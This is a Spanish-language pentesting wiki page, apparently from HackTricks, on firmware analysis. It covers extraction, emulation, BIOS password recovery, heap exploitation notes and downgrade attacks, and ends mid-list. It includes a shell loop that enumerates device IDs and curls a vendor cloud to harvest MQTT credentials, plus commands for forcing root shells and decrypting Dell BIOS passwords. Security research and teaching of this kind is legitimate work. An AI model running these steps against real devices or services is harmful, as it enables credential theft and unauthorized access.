# Análisis de firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introducción**

### Recursos relacionados

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es software esencial que permite que los dispositivos funcionen correctamente al gestionar y facilitar la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende y permite iniciar el sistema operativo. Examinar y, posiblemente, modificar el firmware es un paso crucial para identificar vulnerabilidades de seguridad.<sup>[[2]](#references)[[3]](#references)</sup>

## **Recopilación de información**

La **recopilación de información** es un paso inicial fundamental para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Detalles del bootloader
- Diseño del hardware y hojas de datos
- Métricas del código base y ubicaciones del código fuente
- Bibliotecas externas y tipos de licencia
- Historial de actualizaciones y certificaciones reglamentarias
- Diagramas de arquitectura y flujo
- Evaluaciones de seguridad y vulnerabilidades identificadas

Para este propósito, las herramientas de **inteligencia de fuentes abiertas (OSINT)** son invaluables, al igual que el análisis de cualquier componente de software de código abierto disponible mediante procesos de revisión manuales y automatizados. Herramientas como [Coverity Scan](https://scan.coverity.com) y [LGTM de Semmle](https://lgtm.com/#explore) ofrecen análisis estático gratuito que se puede aprovechar para encontrar posibles problemas.

## **Obtención del firmware**

La obtención del firmware puede realizarse de distintas formas, cada una con su propio nivel de complejidad:

- Obtenerlo **directamente** de la fuente (desarrolladores o fabricantes)
- **Compilarlo** siguiendo las instrucciones proporcionadas
- **Descargarlo** desde sitios oficiales de soporte
- Usar búsquedas con **Google dork** para encontrar archivos de firmware alojados
- Acceder directamente al **almacenamiento en la nube**, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptar **actualizaciones** mediante técnicas man-in-the-middle
- **Extraerlo** del dispositivo mediante conexiones como **UART**, **JTAG** o **PICit**
- **Capturar** solicitudes de actualización dentro de las comunicaciones del dispositivo
- Identificar y usar **endpoints de actualización codificados de forma fija**
- **Volcarlo** desde el bootloader o la red
- **Retirar y leer** el chip de almacenamiento, como último recurso, usando las herramientas de hardware adecuadas

### Registros solo por UART: forzar un root shell mediante el entorno de U-Boot en la memoria flash

Si se ignora UART RX (solo hay registros), aún puedes forzar un shell de init **editando sin conexión el blob del entorno de U-Boot**:<sup>[[6]](#references)</sup>

1. Volcar la memoria flash SPI con una pinza SOIC-8 y un programador (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localiza la partición env de U-Boot, edita `bootargs` para incluir `init=/bin/sh` y **vuelve a calcular el CRC32 del env de U-Boot** para el blob.
3. Vuelve a flashear solo la partición env y reinicia; debería aparecer un shell en UART.

Esto resulta útil en dispositivos integrados donde el shell del bootloader está deshabilitado, pero se puede escribir en la partición env mediante acceso a la memoria flash externa.

## Análisis del firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Puedes usar distintas herramientas para ello:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si es baja, probablemente no esté cifrada. Si es alta, probablemente esté cifrada (o comprimida de alguna manera).

Además, puedes usar estas herramientas para extraer **archivos incrustados en el firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

También puedes usar [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Análisis diferencial de flash y almacenes de secretos XOR recuperables

Cuando un ajuste del firmware no tiene un formato de almacenamiento documentado, primero realiza varias lecturas coincidentes de la flash, cambia **exactamente un** ajuste, vuelve a volcar el chip completo y compara los desplazamientos. Repetir el experimento con valores controlados permite distinguir el ajuste de los contadores y los metadatos de escritura; los cambios en nuevos desplazamientos, en lugar de sobrescribir los datos existentes, indican un almacén de solo anexado o estructurado como un registro. Conserva las entradas eliminadas o marcadas como eliminadas, ya que sus bytes de carga útil podrían seguir siendo recuperables.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Después de localizar la región, extrae los módulos del firmware con herramientas como `binwalk` y haz ingeniería inversa del escritor/validador en Ghidra. Confirma en el código los límites de los campos, el relleno, la indexación de claves y la derivación de claves, en lugar de inferir el esquema únicamente a partir de patrones del texto cifrado.<sup>[[10]](#references)</sup>

#### Recuperar claves a partir del relleno cifrado con ceros

Como se describe en [cifrado basado en XOR](../../crypto/symmetric/#xor-based-encryption), el texto plano conocido revela bytes del flujo de claves en los mismos offsets. Un campo de tamaño fijo queda especialmente expuesto cuando su relleno con ceros abarca todos los índices de una clave XOR repetida: el relleno cifrado revela directamente esos bytes de la clave, porque `0x00 XOR key_byte = key_byte`. Si se cubren todos los índices de la clave, reconstruye la clave a partir de la cola del texto cifrado y descifra los bytes con datos.<sup>[[10]](#references)</sup>

El formato vulnerable de contraseña de BIOS DVAR de Dell es un ejemplo concreto: el byte `0` de un campo de 32 bytes está en texto plano, mientras que los bytes `1..31` usan una clave repetida de 20 bytes.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Para una longitud de contraseña `L`, las posiciones `L..31` eran cero antes del XOR. Cuando `L <= 12`, esas posiciones cubren todos los índices de la clave, por lo que se recuperan la clave completa y la contraseña sin necesidad de fuerza bruta:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Extraer claves de registros históricos

No analices cada registro de forma independiente. La clave DVAR se deriva aproximadamente como `modified_md5(device_seed || variable_GUID || password[0])`: la semilla del dispositivo y el GUID son fijos, y la única entrada dependiente de la contraseña es el primer byte en claro. Esto da como máximo 256 claves por dispositivo y hace que los registros que comienzan con el mismo byte compartan una clave. Agrupa los registros activos y eliminados según ese byte; un registro histórico corto puede filtrar la clave completa mediante el padding y descifrar un registro actual más largo cuyo propio padding sea insuficiente. Por tanto, la rotación de contraseñas puede aumentar la exposición cuando el ciphertext antiguo se marca como eliminado en lugar de borrarse.<sup>[[10]](#references)</sup>

La herramienta [`dellpwn`](https://github.com/R3n5k1/dellpwn) localiza DVAR, valida registros candidatos, recupera contraseñas y puede mostrar los bytes almacenados/en bruto y de la clave. Compílala desde un checkout y analiza una imagen flash verificada como se indica a continuación:<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Para los parsers personalizados, descarta los falsos positivos usando la estructura de los registros, restricciones sobre caracteres imprimibles, comprobaciones de relleno con ceros, entropía de la clave y coherencia cuando la clave da la vuelta. Si varios volcados muestran cambios de bits dispersos por escritura, enumera las máscaras observadas y ordena las correcciones según estas restricciones, pero indica los caracteres ambiguos en lugar de presentar un resultado heurístico como una recuperación exacta.<sup>[[10]](#references)</sup>

Los verificadores de contraseñas deben almacenar un hash unidireccional con sal e iteraciones, en lugar de texto cifrado reversible, y los almacenes estructurados en registros deben eliminar de forma segura el material secreto reemplazado.<sup>[[10]](#references)</sup>

### Obtener el sistema de archivos

Con las herramientas comentadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
Binwalk suele extraerlo dentro de una **carpeta con el nombre del tipo de sistema de archivos**, que normalmente es uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces, binwalk **no tendrá los bytes mágicos del sistema de archivos entre sus firmas**. En estos casos, usa binwalk para **encontrar el offset del sistema de archivos y extraer por carving el sistema de archivos comprimido** del binario, y **extrae manualmente** el sistema de archivos según su tipo siguiendo los pasos a continuación.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Ejecuta el siguiente **comando dd** para hacer el carving del sistema de archivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

También se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Los archivos estarán en el directorio "`squashfs-root`" después de la extracción.

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con memoria flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Análisis del firmware

Una vez obtenido el firmware, es esencial analizarlo en detalle para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar varias herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para inspeccionar inicialmente el archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer cadenas, analizar datos binarios y comprender los detalles de las particiones y del sistema de archivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para evaluar el estado del cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere que no hay cifrado, mientras que una entropía alta indica un posible cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspeccionar archivos.

### Extracción del sistema de archivos

Con `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio con el nombre de su tipo (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no reconoce el tipo de sistema de archivos debido a la falta de magic bytes, es necesario extraerlo manualmente. Esto implica usar `binwalk` para localizar el desplazamiento del sistema de archivos y, luego, el comando `dd` para extraerlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Después, según el tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se usan distintos comandos para extraer manualmente el contenido.

### Análisis del sistema de archivos

Una vez extraído el sistema de archivos, comienza la búsqueda de fallos de seguridad. Se presta atención a los daemons de red inseguros, las credenciales hardcodeadas, los endpoints de API, las funcionalidades del servidor de actualización, el código sin compilar, los scripts de inicio y los binarios compilados para su análisis offline.

Entre las **ubicaciones clave** y los **elementos** que se deben inspeccionar se incluyen:

- **etc/shadow** y **etc/passwd** para encontrar credenciales de usuario
- Certificados y claves SSL en **etc/ssl**
- Archivos de configuración y scripts para detectar posibles vulnerabilidades
- Binarios embebidos para un análisis posterior
- Servidores web y binarios comunes de dispositivos IoT

Varias herramientas ayudan a descubrir información sensible y vulnerabilidades dentro del sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información sensible
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para un análisis exhaustivo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para el análisis estático y dinámico

### Comprobaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben examinarse minuciosamente para detectar vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios desprotegidos que podrían explotarse.

## Obtención de la configuración cloud y las credenciales MQTT mediante tokens de URL derivados

Muchos hubs IoT obtienen su configuración específica de cada dispositivo desde un endpoint cloud con un formato similar a este:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware, es posible que descubras que `<token>` se deriva localmente del ID del dispositivo mediante un secreto hardcodeado, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y se representa como hexadecimal en mayúsculas

Este diseño permite que cualquiera que conozca un deviceId y la STATIC_KEY reconstruya la URL y obtenga la configuración cloud, que a menudo revela credenciales MQTT en texto plano y prefijos de topics.

Flujo de trabajo práctico:

1) Extraer deviceId de los logs de arranque UART

- Conecta un adaptador UART de 3,3 V (TX/RX/GND) y captura los logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Busca líneas que impriman el patrón de URL de configuración de cloud y la dirección del broker, por ejemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperar STATIC_KEY y el algoritmo del token desde el firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Recopilar la configuración de cloud y las credenciales de MQTT

- Construye la URL y descarga el JSON con curl; analízalo con jq para extraer los secretos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abusa de MQTT en texto plano y de ACL débiles para topics (si existen)

- Usa las credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar ID de dispositivos predecibles (a gran escala, con autorización)

- Muchos ecosistemas incorporan bytes de OUI/producto/tipo del proveedor seguidos de un sufijo secuencial.
- Puedes iterar sobre ID candidatos, derivar tokens y obtener configs mediante programación:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Obtén siempre autorización explícita antes de intentar una enumeración masiva.
- Siempre que sea posible, prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo.


El proceso de emulación del firmware permite realizar **análisis dinámico** del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede presentar dificultades relacionadas con dependencias de hardware o arquitectura, pero transferir el sistema de archivos raíz o binarios específicos a un dispositivo con la misma arquitectura y endianness, como una Raspberry Pi, o a una máquina virtual preconfigurada, puede facilitar pruebas adicionales.

### Emular binarios individuales

Para examinar programas individuales, es fundamental identificar el endianness y la arquitectura de la CPU del programa.

#### Ejemplo con arquitectura MIPS

Para emular un binario con arquitectura MIPS, se puede usar el comando:

```bash
file ./squashfs-root/bin/busybox
```

Y para instalar las herramientas de emulación necesarias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), se utiliza `qemu-mips`, y para los binarios little-endian, se elegiría `qemu-mipsel`.

#### Emulación de la arquitectura ARM

Para los binarios ARM, el proceso es similar: se utiliza el emulador `qemu-arm` para la emulación.

### Emulación de sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) y otras facilitan la emulación completa del firmware, automatizan el proceso y ayudan con el análisis dinámico.

### Reconstrucción de sistemas de archivos raíz divididos y verificados para la emulación

Si se puede leer un superbloque de SquashFS, pero los desplazamientos de los inodos, directorios o tablas de fragmentos son imposibles, no modifiques `unsquashfs` de inmediato. Analiza el binario de arranque temprano y reproduce el grafo de dispositivos de bloques que crea: los sistemas integrados pueden exponer una partición raíz nominal, pero construir el sistema de archivos real con una asignación `dm-linear` que añade sectores tomados de otra partición. Las comprobaciones que solo examinan el superbloque pueden tener éxito, aunque todos los bloques de metadatos posteriores estén desplazados.<sup>[[9]](#references)</sup>

Reproduce exactamente las operaciones aritméticas del firmware. En particular, identifica si las longitudes están expresadas en bytes, sectores de 512 bytes o páginas de 4 KiB; reproduce los desplazamientos de bits y el truncamiento en el orden original; y ten en cuenta las regiones finales que dependen del banco en las disposiciones A/B. Por ejemplo, `(partition_bytes >> 12) << 3` primero trunca a un límite de 4 KiB y solo después expresa el resultado en sectores de 512 bytes; sustituirlo por `partition_bytes // 512` puede desplazar unos pocos kilobytes la extensión añadida y corromper todas las tablas SquashFS posteriores.<sup>[[9]](#references)</sup>

Un flujo de validación útil es:<sup>[[9]](#references)</sup>

1. Recuperar del binario del verificador/init el dispositivo de origen, el sector inicial y la longitud de cada segmento `dm-linear`.
2. Concatenar o asignar las extensiones sin cambiar la semántica de alineación.
3. Si la extracción sigue fallando, buscar solo en una ventana pequeña alrededor del límite previsto y exigir varias estructuras de metadatos válidas consecutivas, en lugar de aceptar únicamente un superbloque plausible.
4. Ejecutar un `unsquashfs` sin modificar en la imagen reconstruida; recorrer correctamente todos los directorios y fragmentos es una evidencia más sólida que `unsquashfs -stat`.

#### Sustitución de dm-verity controlada por el analista

Cuando el analista controla el kernel de QEMU, el initramfs y los discos virtuales, se puede arrancar una raíz modificada sustituyendo el PID 1 de verificación del proveedor por un init pequeño enlazado estáticamente. Esto es una **sustitución de la cadena de arranque en laboratorio**, no una vulneración de dm-verity, su firma RSA, Secure Boot ni una clave sellada a un TPM.<sup>[[9]](#references)</sup>

El init de reemplazo debe reflejar los componentes operativos de la ruta de arranque original: montar `devtmpfs`, llamar a `setsid()`, conectar `/dev/console` a los descriptores de archivo 0–2, montar `/proc` y `/sys`, esperar al dispositivo de bloques proporcionado, montar en solo lectura la raíz editada, desmontar los seud sistemas de archivos de la raíz antigua, mover el nuevo montaje a `/`, ejecutar `chroot` y, por último, `execve()` el `/sbin/init` original del firmware. Desmontar `/dev`, `/proc` y `/sys` **antes** de `MS_MOVE` evita desmontar accidentalmente puntos de montaje que pertenezcan a la nueva raíz.<sup>[[9]](#references)</sup>

Mantén separado el estado mutable del dispositivo y la raíz inmutable modificada. Una superposición qcow2 puede conservar el estado LVM del disco original, mientras que un segundo disco virtio de solo lectura proporciona el SquashFS editado:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Depuración del estado de la imagen sin conexión

Inspecciona el estado persistente fuera del guest cuando los arranques lentos, los scripts de inicio destructivos o los registros de consola poco fiables dificulten identificar el fallo. Nunca conectes un overlay que esté usando una VM en ejecución; expón la imagen con `qemu-nbd`, limita la detección de LVM a la partición NBD prevista y desactiva el grupo de volúmenes antes de desconectarlo.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Para aislar fallos de forma reproducible, escribe archivos marcadores con marcas de tiempo en un volumen estable con permisos de escritura y verifícalos sin conexión; `/dev/kmsg`, las FIFO y las consolas transitorias pueden generar falsos negativos por limitación de tasa o por la terminación prematura de procesos. Compara también las interfaces exactas entre capas antes de modificar código no relacionado: `uname -r` frente a `/lib/modules/`, las características de ext4 en disco frente a la configuración del kernel, y la generación de `libGL` de Mesa frente a la ABI del controlador DRI y los nombres de controladores derivados de PCI. Un componente puede existir e incluso cargarse correctamente mediante `dlopen()` y, aun así, ser inutilizable porque el consumidor espera una ABI diferente.<sup>[[9]](#references)</sup>

## Análisis dinámico en la práctica

En esta etapa, se utiliza un entorno de dispositivo real o emulado para el análisis. Es esencial mantener el acceso al shell del sistema operativo y al sistema de archivos. Es posible que la emulación no reproduzca fielmente las interacciones con el hardware, por lo que a veces será necesario reiniciarla. El análisis debe volver a examinar el sistema de archivos, explotar páginas web y servicios de red expuestos, y explorar vulnerabilidades del bootloader. Las pruebas de integridad del firmware son fundamentales para identificar posibles vulnerabilidades de backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución consiste en interactuar con un proceso o binario en su entorno operativo, utilizando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un debugger completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y conéctate de forma remota:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapeo de mensajes de Zigbee / coprocesador de radio

En los hubs IoT, la pila de RF suele estar dividida entre un **MCU de radio** y un proceso de espacio de usuario de Linux. Un flujo de trabajo útil consiste en mapear la ruta:<sup>[[8]](#references)</sup>

1. **Trama RF** transmitida por el aire
2. **Analizador del lado del controlador** en el MCU de radio
3. **Protocolo de texto o TLV por serie/UART** reenviado a Linux (por ejemplo, `/dev/tty*`)
4. **Dispatcher de la aplicación** en el daemon principal
5. **Controlador específico del protocolo / máquina de estados**

Esta arquitectura crea dos objetivos de ingeniería inversa en lugar de uno. Si el controlador convierte las tramas de radio binarias en un protocolo textual como `Group,Command,arg1,arg2,...`, determina:

- Los **grupos de mensajes** y las tablas de dispatch
- Qué mensajes pueden proceder de la **red** y cuáles del propio controlador
- Los campos discriminadores exactos **específicos del fabricante** (por ejemplo, Zigbee `manufacturer_code` y `cluster_command` personalizados)
- Qué controladores solo son accesibles durante las fases de **commissioning**, descubrimiento o descarga de firmware/modelo

En Zigbee específicamente, captura el tráfico de emparejamiento y comprueba si el objetivo sigue usando la **Link Key** predeterminada `ZigBeeAlliance09`. De ser así, interceptar el tráfico de commissioning podría revelar la **Network Key**. Los códigos de instalación de Zigbee 3.0 reducen esta exposición, así que anota si el dispositivo probado realmente los exige.

### Controladores de protocolo específicos del fabricante y accesibilidad condicionada por FSM

Los comandos Zigbee/ZCL específicos del fabricante suelen ser un mejor objetivo que los clusters estandarizados, porque alimentan **código de análisis personalizado** y **FSM** internas con validaciones menos probadas.<sup>[[8]](#references)</sup>

Flujo de trabajo práctico:

- Aplica ingeniería inversa al dispatcher de comandos hasta encontrar el **controlador exclusivo del fabricante**.
- Recupera las tablas de **estado**, **evento**, **comprobación**, **acción** y **estado siguiente** de la FSM.
- Identifica los **estados transitorios** que avanzan automáticamente, así como las ramas de reintento/error que finalmente restablecen o liberan el estado controlado por el atacante.
- Confirma qué intercambios legítimos del protocolo se necesitan para poner el daemon en el estado vulnerable, en lugar de asumir que siempre se puede acceder al controlador defectuoso.

En protocolos sensibles al tiempo, la reproducción de paquetes desde un framework de Python puede ser demasiado lenta. Un enfoque más fiable consiste en emular un dispositivo legítimo con hardware real (por ejemplo, un **nRF52840**) y una pila de nivel de fabricante, para exponer los **endpoints**, **atributos** y tiempos de commissioning correctos.

### Clase de errores de descarga fragmentada en daemons embebidos

Una clase recurrente de errores de firmware aparece en las descargas **fragmentadas de blobs/modelos/configuración**:<sup>[[8]](#references)</sup>

1. El **primer fragmento** (`offset == 0`) almacena `ctx->total_size` y asigna `malloc(total_size)`.
2. Los fragmentos posteriores solo validan campos **locales al paquete** controlados por el atacante, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar que no supere el **tamaño asignado originalmente**.

Esto permite que un atacante envíe:

- Un primer fragmento válido con un tamaño total declarado **pequeño** para forzar una asignación pequeña en el heap.
- Un fragmento posterior con el **offset esperado**, pero un `chunk_len` mayor.
- Un tamaño local al paquete falsificado que supera las comprobaciones recientes, pero que aun así desborda el búfer asignado originalmente.

Cuando la ruta vulnerable está detrás de la lógica de commissioning, la explotación debe incluir suficiente **emulación del dispositivo** para llevar el objetivo al estado esperado de descarga de modelo o de blob antes de enviar los fragmentos malformados.

### Activadores de `free()` controlados por el protocolo

En los daemons embebidos, la forma más sencilla de activar la explotación de metadatos del heap a menudo no es «esperar a que se limpie», sino **forzar el manejo de errores propio del protocolo**:<sup>[[8]](#references)</sup>

- Envía fragmentos de seguimiento malformados para llevar la FSM a estados de **reintento** o **error**.
- Supera el umbral de reintentos para que el daemon **restablezca el contexto** y libere el búfer corrupto.
- Usa este `free()` predecible para activar primitivas del asignador antes de que el proceso falle por motivos ajenos.

Esto resulta especialmente útil contra asignadores **similares a musl/uClibc/dlmalloc** en Linux embebido, donde corromper los metadatos de los chunks puede convertir la lógica de unlink/unbin en una primitiva de escritura. Un patrón estable consiste en corromper un **campo de tamaño** para redirigir el recorrido del asignador hacia **chunks falsos preparados dentro del búfer desbordado**, en lugar de sobrescribir directamente punteros reales de las bins y provocar que el proceso falle.

## Explotación binaria y prueba de concepto

Desarrollar un PoC para las vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones del entorno de ejecución binario son poco comunes en sistemas embebidos, pero, cuando están presentes, pueden ser necesarias técnicas como Return Oriented Programming (ROP).

### Notas sobre la explotación de fastbins de uClibc (Linux embebido)

- **Fastbins + consolidación:** uClibc usa fastbins similares a los de glibc. Una asignación grande posterior puede activar `__malloc_consolidate()`, por lo que cualquier chunk falso debe superar las comprobaciones (tamaño razonable, `fd = 0` y chunks circundantes considerados «en uso»).<sup>[[6]](#references)</sup>
- **Binarios non-PIE bajo ASLR:** si ASLR está habilitado, pero el binario principal es **non-PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se parezca a una cabecera válida de chunk del heap para que una asignación fastbin recaiga en una **tabla de punteros a funciones**.
- **NUL que detiene el analizador:** cuando se analiza JSON, un `\x00` en el payload puede detener el análisis y conservar los bytes posteriores controlados por el atacante para un pivote de pila/cadena ROP.
- **Shellcode mediante `/proc/self/mem`:** una cadena ROP que invoque `open("/proc/self/mem")`, `lseek()` y `write()` puede colocar shellcode ejecutable en un mapeo conocido y saltar a él.

## Sistemas operativos preparados para el análisis de firmware

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para probar la seguridad del firmware, equipados con las herramientas necesarias.

## Sistemas operativos preparados para analizar firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distribución diseñada para ayudarte a realizar evaluaciones de seguridad y pruebas de penetración de dispositivos del Internet de las cosas (IoT). Ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias instaladas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo para pruebas de seguridad de dispositivos embebidos basado en Ubuntu 18.04, con herramientas de prueba de seguridad de firmware preinstaladas.

## Ataques de downgrade de firmware y mecanismos de actualización inseguros

Aunque un proveedor implemente comprobaciones criptográficas de firmas para las imágenes de firmware, con frecuencia se omite la **protección contra la reversión de versión (downgrade)**. Si el cargador de arranque o de recuperación solo verifica la firma con una clave pública integrada, pero no compara la *versión* (ni un contador monotónico) de la imagen que se instala, un atacante puede instalar legítimamente un **firmware antiguo y vulnerable que todavía tenga una firma válida**, reintroduciendo así vulnerabilidades corregidas.<sup>[[4]](#references)</sup>

Flujo de ataque típico:

1. **Obtén una imagen antigua firmada**
   * Descárgala del portal público de descargas, CDN o sitio de soporte del proveedor.
